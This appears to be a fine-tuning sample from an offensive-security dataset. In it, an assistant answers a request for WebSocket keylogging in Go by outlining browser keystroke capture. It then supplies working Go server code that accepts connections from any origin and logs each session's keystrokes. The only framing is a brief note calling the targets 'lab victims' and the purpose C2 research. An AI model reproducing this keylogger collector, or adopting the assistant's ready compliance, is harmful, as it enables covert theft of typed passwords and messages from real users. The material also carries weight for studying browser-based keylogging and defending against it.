# INFO_DISCLOSURE — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: info_disclosure
- cwe: CWE-200

## Scenario

How can I implement keylogging over WebSockets in a Go HTTP server for a lab exercise?

## Analysis / Response

Black Hat Go demonstrates browser keylogging via the WebSocket API paired with a Go server. Conceptually:

1. Serve a page that attaches `keydown` listeners and sends characters over a WebSocket.
2. Upgrade HTTP connections with a WebSocket library (e.g. `gorilla/websocket`).
3. Read frames and append to a per-session log.

Server sketch:

```go
var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }} // tighten in real use

func wsKeylog(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil { return }
    defer conn.Close()
    for {
        _, msg, err := conn.ReadMessage()
        if err != nil { break }
        log.Printf("keystroke session=%s data=%s", r.RemoteAddr, msg)
    }
}
```

Tighten `CheckOrigin`, use TLS, and isolate to lab victims. This is for authorized awareness exercises and C2 research — not covert collection on production users.

**Grounding.** Follow the corresponding Black Hat Go chapter patterns: standard library first, third-party packages only when the book does (miekg/dns, gopacket, gRPC), and keep snippets short enough to paste into a lab. Always scope targets explicitly for authorized testing.
